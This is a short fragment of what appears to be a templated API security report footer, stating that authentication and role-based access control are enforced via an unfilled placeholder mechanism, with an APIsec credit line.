Authentication and role-based access control properly enforced via <mechanism described>.

Powered by APIsec · apisec.ai
```
